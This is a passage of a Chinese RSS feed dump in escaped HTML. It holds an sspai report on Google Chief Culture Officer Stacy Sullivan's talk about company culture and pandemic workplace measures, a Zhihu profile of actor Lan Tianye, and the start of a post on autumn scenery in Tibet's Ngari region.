href=\"https://www.cnet.com/tech/services-and-software/meet-googles-culture-czar/\">称为</a>「Google 文化的权威领导」（Google's culture czar）。除在 Google 担任 CCO 外，Sullivan 还兼任母公司 Alphabet 人力运营副总裁。</p>\n<p>9 月 3 日，Sullivan 通过 Google Meet 举办了一场媒体分享活动，内容涉及 Google 独特的企业文化、值得借鉴的文化建设经验，以及疫情期间为员工提供合适的工作场所、帮助员工维持人际关系和社区的举措。少数派受邀全程参与，并和在场的其他媒体参与了随后的问答交流环节。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/07/491fd96013d1e8dc86f8d7e61b311ebf.jpg\"><figcaption>Stacy Savides Sullivan</figcaption></figure><h2><strong>关于「首席文化官」的头衔</strong></h2>\n<blockquote><p>首席文化官发挥的更多是一种精神性的作用。</p></blockquote>\n<p>Sullivan 首先介绍了「首席文化官」这一独特岗位的职责。她说，与运营方面的职能相比，CCO 发挥的更多是一种「精神性」（spiritual）的作用：调动 Google 内部的文化积极性，鼓励员工和管理层同时参与到正面文化的建设中。</p>\n<p>那么，Google 要建设什么样的文化呢？在 Sullivan 的分享中，几个反复出现的关键词是创新、开放、共享和员工参与。</p>\n<p>Sullivan 特别回忆了 Google 在 2004 年上市之时，创始人 Larry Page 和 Sergey Brin 在<a href=\"https://www.sec.gov/Archives/edgar/data/1288776/000119312504142742/ds1a.htm#toc59330_1\">招股书</a>（Form S-1）中致投资者的信。该信开篇即与文化相关，称 Google 一直强调「创造和挑战」的氛围。信中指出，Google 的工作核心和首要目标是「服务最终用户」，公司的责任在于让用户自由触及公正、准确的信息。Sullivan 说，这些价值在今天仍然是 Google 文化的核心。</p>\n<p>Sullivan 强调了文化建设和员工参与之间的双向关系。一方面，文化建设让员工对工作始终保有动力和兴趣，而不至于像一些大公司中容易发生的那样，员工出工不出力，上班的目的仅仅是「打卡」。另一方面，文化建设依赖于员工的主动性。在 Google 文化的形成过程中，员工自下而上、自主自愿的参与发挥了重要作用。</p>\n<p>有鉴于此，Google 努力营造一种氛围，让员工感到有权利、受鼓励担当「主人」的角色，积极参与本职工作之外的活动和项目。具体做法上，Google 员工自主举办了形式多样的「文化俱乐部」（Culture Clubs），还结成了遍及全球办公室的「<a href=\"https://diversity.google/commitments/\">员工资源小组</a>」（Employee Resource Groups），为具有不同身份和需求的 Google 员工相互帮助提供空间。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/677dc066938600942333a14b1c9087ef.png\"><figcaption>Google 员工志愿帮助女生学习计算机科学（来源：Google）</figcaption></figure><h2><strong>Google 如何应对疫情「新常态」</strong></h2>\n<blockquote><p>疫情给每个人造成的挑战是不尽相同，也在不断变动的。公司需要主动倾听并作出制度上的灵活安排。</p></blockquote>\n<p>2020 的新冠疫情影响了每个人的生活和工作，也给公司的运营管理带来了极大的挑战。那么，Google 是怎样应对疫情作出调整的？Google 文化在这些调整过程中起到了怎样的作用？这也是 Sullivan 此次分享的核心话题。</p>\n<p>Sullivan 从三个角度介绍了 Google 的经验：</p>\n<p><strong>第一，坚守价值和文化根基。</strong> 在同事相互隔离、联系减弱的抗疫期间，如何维持 Google 看重的「创业精神」是一个必须面对的问题。特别是对于疫情期间加入的「Noogler」（noob 和 Googler 的合成词，指 Google 的新员工）而言，可能从入职以来就没有机会迈进过办公室，通过合适方式让他们快速融入团队就更显得重要。</p>\n<p>Sullivan 说，在短暂的适应过程后，Google 团队很快意识到，相比于实体办公空间，更重要的是开放和协作的氛围，而这原本就是 Google 文化建设中的关键价值。相应地，Google 进一步扩大了给员工的自由空间，鼓励他们开展新项目、做出自主决策、发出更多声音——「自己做自己的带头人」。</p>\n<p><strong>第二，灵活调整制度，适应新常态。</strong> 疫情给每个人造成的挑战是不尽相同，也在不断变动的。Google 就发现，实施居家办公后，员工遇到的困难每个月都在变化：最开始集中于技术方面（怎样在家搭起一个办公空间），后来则更多体现为心理方面（如何应对孤独感）和生活方面（如何一边工作一边照顾好子女）。对此，公司就更需要主动倾听，了解员工的需求，并作出制度上的灵活安排。</p>\n<p>Sullivan 举了两项 Google 的具体措施为例。一是「照护假」（Carer's Leave）制度。在疫情之初，Google 考虑到为人父母的员工需要看护子女接受线上教学，难以充分平衡工作时间，为这类员工提供了时长 6 周的带薪假期。后来，这一假期进一步延长到 14 周，并且不限于有子女的员工，而是只要员工需要为亲近的人提供额外照料，都可以申请。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/473b58a4992bda2d84a75bc2f9ef0ecc.jpg\"><figcaption>与孩子一起居家办公（来源：Google）</figcaption></figure><p>二是「全球停工日」（Global Day-Off）制度。这是由 CEO Sundar Pichai 本人发起，主要考虑到远程办公导致了密集的视频会议和邮件往来，让大量员工疲于案牍。因此，公司将一些日子定为「停工日」，作为让员工恢复精力的「离线时间」。</p>\n<p><strong>第三，积极实验创新，在线上建立人际关系和社区。</strong> 如上所述，Google 文化的建设很大程度上依赖于员工自发组织的活动和社群。因此，Google 在「战疫」中的重点工作之一，就是在线上延续和拓展这些人际联系的机会；Sullivan 认为，这比纯粹提供物质福利更能促进团队的热情。</p>\n<p>为此，居家办公期间，Google 将很多原有的线下活动搬到了线上，其参与范围也打破了办公室的地域隔阂，例如线上健身课、Lunch Ninja（随机匹配不同职能部门员工共用午餐）等。「<a href=\"https://rework.withgoogle.com/guides/learning-development-employee-to-employee/steps/introduction/\">g2g</a>」（Googler-to-Googler）也发展成为全球员工相互展示和教授才艺技能的线上空间，其主题从硬核的 Python 编程到生活化的带娃技巧不一而足；中国办公室的同事还贡献了私藏的菜谱和电影片单。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/07/e59423496b69a1c43fd585cca535ea17.jpg\"><figcaption>带上爱犬与同事一起远程下厨（来源：Google）</figcaption></figure><p>除了帮助员工，如何用自身资源帮助更多的人共克时艰，也在 Google 考虑的范围之内。疫情开始后不久，Google 就向员工征求建议，并收到了数千条反馈，进而从中筛选出约 100 项付诸执行。以教育领域为例，Google 给偏远地区的学生捐赠了几千台 Chromebook 笔记本；YouTube 为不能线下相聚的毕业生举办了在线直播的毕业典礼等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/8a908184f9cb90749cbd739f71ffa622.jpg\"><figcaption>硬件团队员工为一线工作人员制作面罩（来源：Google）</figcaption></figure><h2><strong>公司规模扩张与文化建设</strong></h2>\n<blockquote><p>随着公司规模的扩大，职位层级变多、决策流程变长的问题不可避免；Google 鼓励员工积极指出导致公司文化迟缓、膨胀的因素，提出解决思路。</p></blockquote>\n<p>前面提到，Sullivan 加入 Google 已有 22 年，当了 16 年的 CCO，见证了 Google 从一个 50 人上下的小团队，发展为十几万员工的跨国公司的沧海桑田。那么，Google 的文化是否随着规模扩张而发生变化、或受到挑战？这也是参与分享的媒体在问答环节共同关心的问题。</p>\n<p>对此 Sullivan 回答，无论规模大小，Google 的文化是一以贯之的，经受住了时间的考验。但她同时也承认，规模扩大会给 Google 的文化建设带来新的挑战和需求。例如，在成立初期，多元和包容并未受到特别考虑——因为团队规模小，很多问题只需当面沟通即可解决。但如今 Google 已经成为拥有 14 万余全球员工的跨国公司，必须有意识地开展促进多元化相关工作。</p>\n<p>对此，Google 的做法是给管理层提出更多要求，让他们以身作则，主动与员工沟通公司对员工的期望，并听取员工对公司的感受。此外，Google 还制定和出台了一系列关于多元、包容承诺的政策和工作流程，以期让员工有效反映遭遇的问题，并在此过程中感到安全和关怀。</p>\n<p>又如，随着公司规模的扩大，职位层级变多、决策流程变长的问题不可避免，但 Sullivan 对于维持开放、平等的文化仍然充满信心，认为通过恰当的制度建设和不断的反思，大公司也可以保持敏捷快速的决策流程和鼓励创造的工作环境。</p>\n<p>她提到，现任的 Sundar Pichai 是一名「尤其重视运营管理」的 CEO。Pichai 要求将沟通场合「去中心化」，把自主权下放到局部——用 Google 内部术语说，就是放在「产品领域」（product area）。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/07/66f77015d3cc616064c12d11323eb166.jpg\"><figcaption>现场 + 远程混合方式举行的会议（来源：Google）</figcaption></figure><p>此外，Stacy 还提到，Google 建立了一项「破除官僚主义」（bureaucracy buster）的机制，请员工积极指出导致公司文化迟缓、膨胀的因素，提出解决思路；「无会议周三」等特色制度就是这样经员工「众筹」产生的。同时，Google 会主动反思一些问题现象：这个层级关系真的有必要存在吗？这场会议真的需要拉上这么多人吗？这个决定真的需要花两个星期才能做吗，还是一个星期就够了？</p>\n<p>Sullivan 认为，Google 著名的「20% 时间」制度也有助于避免「大公司病」。这一制度鼓励员工拿出 20% 的工作时间投入不能产生即刻回报，但有长期发展潜力的项目。Sullivan 指出，「20%」当然是一个约数，不同员工实际投入的比例是浮动的，但关键不在于投入多少时间，而在于鼓励员工关心 Google 长远发展，心系用户和社区的。这样一来，规模扩大反而是有利的——更多的员工意味着更多思路和力量。</p>\n<h2>结语</h2>\n<p>熟悉少数派的读者一定知道，我们也始终认同和践行着开放工作文化和远程办公方式。我们的同事中，有约一半<a href=\"https://sspai.com/post/64167\">通过远程方式工作</a>；办公室则历经多次<a href=\"https://sspai.com/post/64331\">布置装饰</a>，力图营造开放、舒适的工作氛围。今年推出的少数派会员刊物，创刊号就<a href=\"https://sspai.com/prime/story/vol01-how-they-work-at-home\">讨论</a>了远程办公相关话题。此次 Google 的分享与沟通，不仅给我们提供了思路和启发，也让我们对自己的路径更感信心。</p>\n<p>你怎样看待 Google 介绍的文化建设相关制度和措施？欢迎在评论区与我们一起交流。</p>\n","link":"https://sspai.com/post/68640"},{"title":"曾出演《渴望》《封神榜》的蓝天野先生获「七一勋章」，你对他的角色有哪些记忆？如何评价他的成就？","date":"2021-09-07 08:27:34","description":"\n<h2>“七一勋章”获得者蓝天野丨新中国话剧事业发展的见证者和参与者</h2>\n<h3>\n<br><b>“七一勋章”</b>\n</h3>\n<p>在庆祝中国共产党成立100周年“七一勋章”颁授仪式上，94岁的北京人民艺术剧院演员、导演蓝天野获颁“七一勋章”。他是新中国话剧事业发展的见证者和参与者，下面小编带大家一起了解这位具有高贵文人风骨与精神的表演艺术家。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-84569193b551901cc59cee7c35fc9c02_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"452\" data-rawheight=\"800\" data-watermark=\"original\" data-original-src=\"v2-84569193b551901cc59cee7c35fc9c02\" data-watermark-src=\"v2-3cd33ab8188eb63c7804ed60e8a0edc3\" data-private-watermark-src=\"v2-ecf2010042f448c0a26f57f396bb6986\"></p>\n<p><br></p>\n<p>蓝天野，原名王润森，河北饶阳人，1927年出生，将一生奉献给人民文艺事业。他青年时代参加革命，从事进步文艺活动。新中国成立后，他出演或导演《蜕变》《茶馆》《家》等数十部优秀文艺作品，塑造了众多经典人物形象，在北京人民艺术剧院演员、导演的岗位上光荣离休。</p>\n<p><br></p>\n<h3>01献身文艺</h3>\n<p>1952年，蓝天野成为北京人民艺术剧院建院后第一批演员，在人艺话剧舞台上兢兢业业、奉献一生。传承艺术艺德，发掘和培养一大批文艺界领军人才，为中国话剧艺术繁荣发展作出重大贡献。<b>荣获“全国优秀共产党员”称号和“中国戏剧奖·终身成就奖”等。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-5e9434c101e472876b6ab37a2449ea87_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-watermark=\"original\" data-original-src=\"v2-5e9434c101e472876b6ab37a2449ea87\" data-watermark-src=\"v2-5bc93a0a6fa53a04ae3faf9b9d16dd90\" data-private-watermark-src=\"v2-b19f5f809260084a9f7a60b40d2feb2d\"></p>\n<p>蓝天野先后在《茶馆》《北京人》《蔡文姬》《家》《甲子园》等70余部话剧中塑造了众多经典人物形象，出演了《渴望》《封神榜》等深受广大观众喜爱的影视剧。演了几十年的戏，到底演过多少个角色，蓝天野没做过精确统计，但每个角色，不论戏多戏少，他都会认真去创造。</p>\n<p><b>茶 馆</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-1e9115928c138ea38c7a082b5dc34042_720w.webp?rss\" data-caption=\"蓝天野参演话剧《茶馆》 北京人艺供图\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"620\" data-watermark=\"original\" data-original-src=\"v2-1e9115928c138ea38c7a082b5dc34042\" data-watermark-src=\"v2-e6f3ed0bc3a9a66900f3b021342cd3e0\" data-private-watermark-src=\"v2-bee719dbd28300dd601c3d075ef23236\"></p>蓝天野参演话剧《茶馆》 北京人艺供图<p>为了演好老舍先生的力作《茶馆》，蓝天野不仅走遍了北京城的大小茶馆，深入观察茶馆里的“老北京”们、说书人、店伙计的一举一动，就连北京城内最后一位“老太监”都成为他的采访和观察对象。为了让“秦二爷”这一角色立得住，蓝天野接触京城里的企业家，通过不断地观察、领悟，反复地酝酿、排练，逐渐“触摸”到这个角色。<br></p>\n<p><b>1958年3月，《茶馆》首演，“秦二爷”一亮相就震惊全场。</b>1980年，北京人民艺术剧院的《茶馆》剧组从北京启程，赴欧洲演出。这是中国话剧第一次漂洋过海，这部戏的受欢迎程度也远远超出演员的预期。蓝天野回忆，当时外国媒体报道如潮，有的评论“你们的《茶馆》是东方的奇迹”；有的评论“这部戏里连没有台词的群众演员都是‘大演员’”。令他印象最深刻的评价是：<b>“看了你们的《茶馆》，才明白中国为什么会发生1949年的革命。”</b>从1957年开始排练《茶馆》到1992年的“告别演出”，蓝天野共出演了374场《茶馆》。他在戏中扮演的角色“秦仲义”，也从风华正茂变得垂垂老矣。</p>\n<p><b>封神榜</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-483d953f65ec4ffebfc982105e28042b_720w.webp?rss\" data-caption=\"电视剧《封神榜》剧照\" data-size=\"normal\" data-rawwidth=\"652\" data-rawheight=\"493\" data-watermark=\"original\" data-original-src=\"v2-483d953f65ec4ffebfc982105e28042b\" data-watermark-src=\"v2-42c9be69a1eb085495738e9475bac61a\" data-private-watermark-src=\"v2-2a27739d6d4d314c1027b64b9c1ba415\"></p>\n<p><br></p>\n<p>1989年，古装神话电视剧《封神榜》开拍，剧组邀请蓝天野出演姜子牙。但拿到剧本，蓝天野并不满意。经对方同意，他反复对比原著、推敲剧本，认真修改了许多幕戏。</p>\n<p>剧中有一幕“文王访贤”，原著中记载的是姜子牙不露声色等文王来访，而剧本却是姜子牙夜访贤人。蓝天野认为姜子牙的表现不符合人物应有的风范，于是动手将这一幕修改为：</p>\n<p><b>西伯侯外出访贤，在渭水河边找到了正在垂钓的姜子牙。</b></p>\n<p><b>西伯侯毕恭毕敬地跟他问好，姜子牙最后说道：“姜尚在此等候多时了！”</b></p>\n<p>就这一句台词顿时<b>将姜太公仙风道骨、沉稳大度的形象表现得淋漓尽致。</b></p>\n<p>4月开机后，62岁的蓝天野跟随剧组，辗转浙江、新疆、敦煌以及深圳等地进行拍摄。近11个月时间里，他特别认真。很多打戏他坚决不用替身，他说：<b>“作为演员，我的形体感觉是可以的。这些由我自己做，因为这是我塑造人物的一部分。”</b></p>\n<p>所以，他塑造的姜子牙，至今仍被千万观众公认为最经典的一版，<b>珠玉在前，后人极难超越。</b></p>\n<p><br></p>\n<h3>02扎根人民</h3>\n<p><img src=\"https://pic2.zhimg.com/v2-a7d7f7fbeda5a08b6fbcbed2f4b6eecd_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"796\" data-rawheight=\"1024\" data-watermark=\"original\" data-original-src=\"v2-a7d7f7fbeda5a08b6fbcbed2f4b6eecd\" data-watermark-src=\"v2-9732f79c536e5821915ed9e2db2e39b6\" data-private-watermark-src=\"v2-50d0af2fc5d99a8cbd83bc5ab07c2ba2\"></p>\n<p>这是“七一勋章”获得者蓝天野（6月29日摄）。新华社记者谢环驰摄<b>扎扎实实融入生活，是蓝天野锤炼演技的核心途径。</b>蓝天野曾表示：“没有小角色，只有小演员。”在他看来，只有会看戏，才会演戏；身为演员，只有注重文化素养的积累、认真观察生活，才能塑造出有血有肉的人物形象。19岁那年，蓝天野要在话剧《青春》中出演一个老农民，他就跑到京郊的农村，坐在井沿上和老乡们闲聊，观察农民的言谈举止；演《大雷雨》里的俄国钟表匠库力金，他不仅熟读俄国小说，还去拜访流亡中国的白俄贵族，把俄国影片《彼得大帝》和《宝石花》看了10遍以上。</p>\n<p>进入人艺后，蓝天野花了很长一段时间去体验生活。他曾到北京琉璃河水泥厂干活。当烧制水泥的转炉出现故障时，他与工人师傅一起身穿石棉服，裹着湿透的棉被，冒着高温进入炉内，用钢钎击打水泥“结圈”。剧院演出不忙时，他主动申请到远郊区县岗上大队待了半年，跟随全国劳模、岗上大队书记吴春山一起生活。他们一起睡在牲口院的炕上，每天起早贪黑干农活、喂牲口。<b>这段经历，为蓝天野塑造农村题材戏剧的角色打下了坚实基础。</b></p>\n<p><br></p>\n<h3>03德艺双馨</h3>\n<p>虽然离休多年，但蓝天野并没有选择颐养天年，他始终关注并参与着中国话剧事业，坚持艺术为国家、艺术为人民，初心不改、矢志不渝。蓝天野曾说，<b>“只要党需要我、观众需要我，我就要发好光和热。”</b>85岁参演《甲子园》、87岁复出执导《吴王金戈越王剑》、88岁再导《贵妇还乡》、90岁执导《大讼师》、93岁参演话剧《家》连续登台11场、94岁再次执导《吴王金戈越王剑》……耄耋之年的蓝天野执着于艺术理想、坚守于话剧舞台、奉献于文化发展，并<b>不断刷新自己创造的年龄最大话剧导表演的纪录。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-296892848e01d46bf63c7d2953bc0a5c_720w.webp?rss\" data-caption=\"蓝天野导演《吴王金戈越王剑》。北京人艺供图\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"533\" data-watermark=\"original\" data-original-src=\"v2-296892848e01d46bf63c7d2953bc0a5c\" data-watermark-src=\"v2-076d62aa9788eb0e460bc7734c021bd9\" data-private-watermark-src=\"v2-2fb02730ed3361265b85849ed788ced6\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-efb5cb417f7e9fa3c7f94a346b03db55_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"683\" data-watermark=\"original\" data-original-src=\"v2-efb5cb417f7e9fa3c7f94a346b03db55\" data-watermark-src=\"v2-251d03f643834195bc9eb266d9dbd3d9\" data-private-watermark-src=\"v2-04e6891785cf7f80ddb084102be4714f\"></p>\n<p>6月16日，蓝天野在北京人民艺术剧院戏剧博物馆向记者指出曾出演的剧目 新华社发（缑宇 摄）在《家》的排演过程中，蓝天野曾不慎摔伤，手指骨折，起身后的第一句话是“对不住大家，让各位受惊了”，第二天仍坚持带伤排练，使所有工作人员从老艺术家的行动中深刻领悟了<b>“戏比天大”</b>的精神。2015年，时隔33年，88岁高龄的蓝天野再次执导瑞士剧作家迪伦马特的代表作《贵妇还乡》。他说：“从复出演出话剧《家》开始，并没有想过会在舞台连续演出作品还当导演，但是一旦回到舞台之上，心情从此就收不住了，因此再次执导《贵妇还乡》也是因为这是一个天才剧作家的作品，对我们这些搞戏的人来说很有吸引力。”对比上个版本，蓝天野表示，好的地方会继续保留，同时寻求新的突破。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3b747d88467c48e04acec34974ed9c4c_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"369\" data-rawheight=\"228\" data-watermark=\"original\" data-original-src=\"v2-3b747d88467c48e04acec34974ed9c4c\" data-watermark-src=\"v2-0bd95a7b3ec092ce4cd195152c293ed3\" data-private-watermark-src=\"v2-c9a6cffc23ee073021aa1b54857e413d\"></p>\n<p>《贵妇还乡》剧照在排练中，蓝天野对每位演员的每一句台词、每一个动作都仔细推敲，认真讲解。一次，因为年轻演员的肢体动作始终不到位，站在一旁的他突然甩掉手里的拐棍儿，倒地进行示范。“只要他在排练厅，他坚韧不拔的精神品质、严肃治戏的敬业精神就不断敲击着年轻演员的心灵。排戏时，老爷子的精神头儿比我们都好。”一提起蓝天野，身边的年轻人总是充满敬佩。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a3d9109b6774e63a1498d3fd271b69a0_720w.webp?rss\" data-caption=\"蓝天野导演《贵妇还乡》。北京人艺供图\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"532\" data-watermark=\"original\" data-original-src=\"v2-a3d9109b6774e63a1498d3fd271b69a0\" data-watermark-src=\"v2-3ab2cbcfa9481cdc0a61f7606b810e72\" data-private-watermark-src=\"v2-6c5624042ed22a82b0d13135ccf5c807\"></p>\n<h3>04书画精妙</h3>\n<p>在充满无数荣耀的演艺事业的背后，是他难以割舍的书画情缘。丰富的演艺生涯为他提供了丰厚的艺术营养。蓝天野《话剧情缘》专题片导视</p>\n<p><br></p>\n<p><b>进入完整版视频专题</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-45ac4722673447cde0333f289d522315_720w.webp?rss\" data-caption=\"（长按二维码-识别图中二维码）\" data-size=\"normal\" data-rawwidth=\"260\" data-rawheight=\"260\" data-watermark=\"original\" data-original-src=\"v2-45ac4722673447cde0333f289d522315\" data-watermark-src=\"v2-6aafc6131384c957d15335c99548c50b\" data-private-watermark-src=\"v2-e20f3e094905a8163780161df2f4c6c8\"></p>\n<p>蓝天野自幼喜欢绘画，青年时曾入国立北平艺专（中央美院前身）学画，离休后重新拾起画笔，陶醉于幼年中断的绘画世界中。其实在他几十年的舞台生涯中也未曾完全离开绘画，还曾拜在李苦禅和许麟庐两位国画大师的门下，潜心学习写意花鸟，兼攻人物绘画。许麟庐题词的“<b>勤于笔墨 独辟蹊径</b>”，是对蓝天野绘画成就的精辟总结，也是他不断追寻的艺术境界。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e76c6fe1479e6950e7f54c1aec39185f_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"386\" data-watermark=\"original\" data-original-src=\"v2-e76c6fe1479e6950e7f54c1aec39185f\" data-watermark-src=\"v2-c0147bfd80740c5363f722cec537a4fe\" data-private-watermark-src=\"v2-556063b4a3f2d9ce6c558dfc51c944fc\"></p>\n<p><br></p>\n<p>蓝天野坚持自己化妆在蓝天野身上，绘画和演戏，看似不相关的两个艺术门类，是可以相互促进、相互影响的两种文化修养。他坚持自己化妆，还能给剧组二三十位演员化妆，而且是根据不同的角色化不同的妆。蓝天野出演话剧《家》第一场上台时手里拿的诗稿，上面的几首诗词都是他自己所作并亲笔手书。他说：<b>“观众看不见这些，但我自己拿着，在台上更多些真实自信。”</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-61ddd712c939e7c985b1aa4281984d96_720w.webp?rss\" data-caption=\"蓝天野  《大吉图》  67×72cm\" data-size=\"normal\" data-rawwidth=\"755\" data-rawheight=\"712\" data-watermark=\"original\" data-original-src=\"v2-61ddd712c939e7c985b1aa4281984d96\" data-watermark-src=\"v2-4ca07ac556be8af2d597e0aab5e2ecb3\" data-private-watermark-src=\"v2-332b219dc2b3308f1431d09c7b214ff8\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-66a063cd922ea3c7f9014ce4b2f2679c_720w.webp?rss\" data-caption=\"蓝天野  《清人诗意图》  67×72cm\" data-size=\"normal\" data-rawwidth=\"810\" data-rawheight=\"745\" data-watermark=\"original\" data-original-src=\"v2-66a063cd922ea3c7f9014ce4b2f2679c\" data-watermark-src=\"v2-2d73e1c920225c1a54a09c0f67b30e44\" data-private-watermark-src=\"v2-63821fb5926f5ff1d7b610f872af1bd7\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-72541901c789216655eb6ae8781955f8_720w.webp?rss\" data-caption=\"蓝天野  《双英》  96×178cm\" data-size=\"normal\" data-rawwidth=\"756\" data-rawheight=\"351\" data-watermark=\"original\" data-original-src=\"v2-72541901c789216655eb6ae8781955f8\" data-watermark-src=\"v2-231a16fc9dcfb5671548b0576f3b3396\" data-private-watermark-src=\"v2-4cc0fc7f99b836e13c68ce33c6a70c19\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-07ba6437c2440b039265f90af169d04d_720w.webp?rss\" data-caption=\"蓝天野  《万古英姿》  96×59cm\" data-size=\"normal\" data-rawwidth=\"501\" data-rawheight=\"771\" data-watermark=\"original\" data-original-src=\"v2-07ba6437c2440b039265f90af169d04d\" data-watermark-src=\"v2-eed9e4d835f0ba0da0e6454669572883\" data-private-watermark-src=\"v2-95951e49bad934dcda9799bc0b0f2edd\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-8ec1e13af2fb7f6cb90bb1db7be2cd11_720w.webp?rss\" data-caption=\"蓝天野 《太公垂钓图》\" data-size=\"normal\" data-rawwidth=\"669\" data-rawheight=\"658\" data-watermark=\"original\" data-original-src=\"v2-8ec1e13af2fb7f6cb90bb1db7be2cd11\" data-watermark-src=\"v2-9baff37b6521e82a913a6b4009159c95\" data-private-watermark-src=\"v2-2b203b0182f0b8babab31cbefd8fa20e\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-451f4b600a86e239f0bf6339b6bbdd99_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"296\" data-rawheight=\"462\" data-watermark=\"original\" data-original-src=\"v2-451f4b600a86e239f0bf6339b6bbdd99\" data-watermark-src=\"v2-0dcca9155a3094ada7285888fa6d9f18\" data-private-watermark-src=\"v2-e0238dd891fc7ba30dbc8ecbf22a3a15\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-a8feda6fa7d91fc0ad3023081ceeaa16_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"498\" data-watermark=\"original\" data-original-src=\"v2-a8feda6fa7d91fc0ad3023081ceeaa16\" data-watermark-src=\"v2-51ab30481b7fd6671a58c090d33ab538\" data-private-watermark-src=\"v2-e83d4970f10066c5fcbc97b7b652a7e3\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-aa3b03b2093ba1bb04e017938269e891_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"648\" data-rawheight=\"364\" data-watermark=\"original\" data-original-src=\"v2-aa3b03b2093ba1bb04e017938269e891\" data-watermark-src=\"v2-e9033339e61bddf8f1644d13b9df742b\" data-private-watermark-src=\"v2-9a7836b9cd423e4fbfab352ccc95860b\"></p>\n<p><b>蓝天野部分书法作品</b></p>\n<p><br></p>\n<p><i>蓝天碧野，赤子情怀。作为新中国话剧事业发展的见证者和参与者，蓝天野坚守话剧舞台70余载，为广大文艺工作者树立了榜样；他将一生奉献给了人民艺术事业，在中国话剧民族化的道路上不懈探索，用一腔热血不断创造着生命的能量和高度，永葆艺术生命之青春。</i></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-wen-yi-wang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国文艺网</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469275545/answer/2107946426?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">17 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/309367961?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">究竟是演员成就了角色，还是角色成就了演员？</a><br><a href=\"http://www.zhihu.com/question/282837625?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">到底是角色成就了演员，还是演员演活了角色？</a><br>\n","link":"http://www.zhihu.com/question/469275545/answer/2107946426?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"中国最美的秋天在哪里？","date":"2021-09-07 06:40:06","description":"\n<p>西藏阿里的秋天是非常美的，以辽阔苍茫壮美为特色。秋天，高原的天越加蓝了，湖边的水草变得红色黄色。和天空色彩形成对比色。</p>\n<h2>金黄、深红和蓝天的高原秋季</h2>\n<p>这是仲巴县附近的棕尾虹雉峰。秋季的草原上，野驴在悠闲自在地吃草：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-550a7e3b642d661567c78163fc5c8008_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-550a7e3b642d661567c78163fc5c8008\" data-watermark-src=\"v2-70f0f988c804c65a0da78efed2187e39\" data-private-watermark-src=\"v2-a4fe441893a7a0a924b86366de899bb5\"></p>\n<p>一般阿里从拉萨出发的旅行包含碧玉一般的圣湖羊卓雍错、多个宗教中心神山冈仁波齐和神湖玛旁雍错、气象万千的鬼湖拉昂错和神山纳木那尼、野生动物聚集的公珠错、气势磅礴、巧夺天工的札达土林、古格王朝遗址星空银河、神秘的东噶皮央洞穴壁画、宗山抗英古堡日落、殊圣的扎实伦布寺等等。</p>\n<a 